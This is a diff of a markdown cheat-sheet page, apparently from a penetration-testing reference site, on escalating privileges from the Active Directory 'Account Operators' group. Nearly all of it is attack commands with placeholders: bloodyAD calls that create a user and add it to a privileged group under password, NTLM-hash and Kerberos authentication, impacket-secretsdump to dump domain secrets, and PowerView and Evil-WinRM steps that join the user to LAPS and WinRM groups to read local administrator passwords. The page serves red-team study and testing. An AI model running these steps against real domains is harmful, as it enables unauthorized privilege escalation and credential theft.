@@ -1,9 +1,11 @@
 ---
 title: "Account Operators"
-tags: ["Active Directory",  "Privilege Escalation",  "Account Operators",  "Credential Dumping",  "LAPS",  "Group Membership Abuse",  "Evil-WinRM",  "PowerView",  "Windows", "Create User"]
+tags: ["Active Directory", "Account Operators", "Create User", "Credential Dumping", "Evil-WinRM", "Group Membership Abuse", "LAPS", "PowerView", "Privilege Escalation", "Windows"]
 ---
 
-### Privesc #1: Create a New User Account and Add it to Privilege Group
+{{< filter_buttons >}}
+
+### Create a New User Account and Add it to Privilege Group
 
 {{< tab set1 tab1 >}}Linux{{< /tab >}}
 {{< tab set1 tab2 >}}Windows{{< /tab >}}
@@ -11,20 +13,83 @@ tags: ["Active Directory",  "Privilege Escalation",  "Account Operators",  "Cred
 
 #### 1. Create a New User Account
 
-```console
+```console {class="password"}
+# Password
 bloodyAD -d '<DOMAIN>' -u '<USER>' -p '<PASSWORD>' --host '<TARGET>' add user '<NEW_USER>' '<NEW_PASSWORD>'
+```
+
+```console {class="ntlm"}
+# NTLM
+bloodyAD -d '<DOMAIN>' -u '<USER>' -p ':<HASH>' -f rc4 --host '<TARGET>' add user '<NEW_USER>' '<NEW_PASSWORD>'
+```
+
+```console {class="password-based-kerberos"}
+# Password-based Kerberos
+bloodyAD -d '<DOMAIN>' -u '<USER>' -p '<PASSWORD>' -k --host '<TARGET>' add user '<NEW_USER>' '<NEW_PASSWORD>'
+```
+
+```console {class="ntlm-based-kerberos"}
+# NTLM-based Kerberos
+bloodyAD -d '<DOMAIN>' -u '<USER>' -p '<HASH>' -f rc4 -k --host '<TARGET>' add user '<NEW_USER>' '<NEW_PASSWORD>'
+```
+
+```console {class="ticket-based-kerberos"}
+# Ticket-based Kerberos
+bloodyAD -d '<DOMAIN>' -u '<USER>' -k --host '<TARGET>' add user '<NEW_USER>' '<NEW_PASSWORD>'
 ```
 
 #### 2. Add the New User to Privilege Group
 
-```console
-bloodyAD -d '<DOMAIN>' -u '<USER>' -p '<PASSWORD>' --host '<TARGET>' add groupMember '<GROUP>' '<NEW_USER>' 
+```console {class="password"}
+# Password
+bloodyAD -d '<DOMAIN>' -u '<USER>' -p '<PASSWORD>' --host '<TARGET>' add groupMember '<GROUP>' '<NEW_USER>'
+```
+
+```console {class="ntlm"}
+# NTLM
+bloodyAD -d '<DOMAIN>' -u '<USER>' -p ':<HASH>' -f rc4 --host '<TARGET>' add groupMember '<GROUP>' '<NEW_USER>'
+```
+
+```console {class="password-based-kerberos"}
+# Password-based Kerberos
+bloodyAD -d '<DOMAIN>' -u '<USER>' -p '<PASSWORD>' -k --host '<TARGET>' add groupMember '<GROUP>' '<NEW_USER>'
+```
+
+```console {class="ntlm-based-kerberos"}
+# NTLM-based Kerberos
+bloodyAD -d '<DOMAIN>' -u '<USER>' -p '<HASH>' -f rc4 -k --host '<TARGET>' add groupMember '<GROUP>' '<NEW_USER>'
+```
+
+```console {class="ticket-based-kerberos"}
+# Ticket-based Kerberos
+bloodyAD -d '<DOMAIN>' -u '<USER>' -k --host '<TARGET>' add groupMember '<GROUP>' '<NEW_USER>'
 ```
 
 #### 3. Secrets Dump
 
-```console
-impacket-secretsdump '<NEW_USER>:<NEW_PASSWORD>@<TARGET>'
+```console {class="password"}
+# Password
+impacket-secretsdump '<DOMAIN>/<NEW_USER>:<NEW_PASSWORD>@<TARGET>'
+```
+
+```console {class="ntlm"}
+# NTLM
+impacket-secretsdump '<DOMAIN>/<NEW_USER>@<TARGET>' -hashes :<HASH>
+```
+
+```console {class="password-based-kerberos"}
+# Password-based Kerberos
+impacket-secretsdump '<DOMAIN>/<NEW_USER>:<NEW_PASSWORD>@<TARGET>' -k
+```
+
+```console {class="ntlm-based-kerberos"}
+# NTLM-based Kerberos
+impacket-secretsdump '<DOMAIN>/<NEW_USER>@<TARGET>' -hashes :<HASH> -k
+```
+
+```console {class="ticket-based-kerberos"}
+# Ticket-based Kerberos
+impacket-secretsdump '<DOMAIN>/<NEW_USER>@<TARGET>' -k
 ```
 
 {{< /tabcontent >}}
@@ -40,21 +105,7 @@ impacket-secretsdump '<NEW_USER>:<NEW_PASSWORD>@<TARGET>'
 *Evil-WinRM* PS C:\programdata> . .\PowerView.ps1
 ```
 
-#### 2. Create a Cred Object (Runas) \[Optional\]
-
-```console
-$username = '<DOMAIN>\<USER>'
-```
-
-```console
-$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
-```
-
-```console
-$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
-```
-
-#### 3. Create a New User Password Object
+#### 2. Create a New User Password Object
 
 ```console
 $new_user_password = ConvertTo-SecureString '<NEW_USER_PASSWORD>' -AsPlainText -Force
@@ -64,39 +115,40 @@ $new_user_password = ConvertTo-SecureString '<NEW_USER_PASSWORD>' -AsPlainText -
 *Evil-WinRM* PS C:\programdata> $new_user_password = ConvertTo-SecureString 'Test1234' -AsPlainText -Force
 ```
 
-#### 4. Create a New User Account
+#### 3. Create a New User Account
 
 ```console
-New-AdUser '<NEW_USER>' -enabled $true -accountpassword $new_user_password -Credential $cred
+New-AdUser '<NEW_USER>' -enabled $true -accountpassword $new_user_password
 ```
 
 ```console {class="sample-code"}
-*Evil-WinRM* PS C:\programdata> New-AdUser 'alice' -enabled $true -accountpassword $new_user_password -Credential $cred
+*Evil-WinRM* PS C:\programdata> New-AdUser 'alice' -enabled $true -accountpassword $new_user_password
 ```
 
-#### 5. Add the New User to LAPS Group
+#### 4. Add the New User to LAPS Group
 
 ```console
-Add-DomainGroupMember -Identity 'LAPS READ' -Members '<NEW_USER>' -Credential $cred
+Add-DomainGroupMember -Identity 'LAPS READ' -Members '<NEW_USER>'
 ```
 
 ```console {class="sample-code"}
-*Evil-WinRM* PS C:\programdata> Add-DomainGroupMember -Identity 'LAPS READ' -Members 'alice' -Credential $cred
+*Evil-WinRM* PS C:\programdata> Add-DomainGroupMember -Identity 'LAPS READ' -Members 'alice'
 ```
 
-#### 6. Add the New User to WinRM Group
+#### 5. Add the New User to WinRM Group
 
 ```console
-Add-DomainGroupMember -Identity 'WinRM' -Members '<NEW_USER>' -Credential $cred
+Add-DomainGroupMember -Identity 'WinRM' -Members '<NEW_USER>'
 ```
 
 ```console {class="sample-code"}
-*Evil-WinRM* PS C:\programdata> Add-DomainGroupMember -Identity WinRM -Credential $cred -Members 'alice'
+*Evil-WinRM* PS C:\programdata> Add-DomainGroupMember -Identity WinRM -Members 'alice'
 ```
 
-#### 7. Remote as New User
+#### 6. Remote as New User
 
-```console
+```console {class="password"}
+# Password
 evil-winrm -i <TARGET> -u '<NEW_USER>' -p '<NEW_USER_PASSWORD>'
 ```
 
@@ -113,7 +165,17 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\alice\Documents> 
 ```
 
-#### 8. Read LAPS Password
+```console {class="ntlm"}
+# NTLM
+evil-winrm -i <TARGET> -u '<NEW_USER>' -H '<NEW_HASH>'
+```
+
+```console {class="ticket-based-kerberos"}
+# Ticket-based Kerberos
+evil-winrm -i <TARGET> -r <DOMAIN>
+```
+
+#### 7. Read LAPS Password
 
 ```console
 Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd
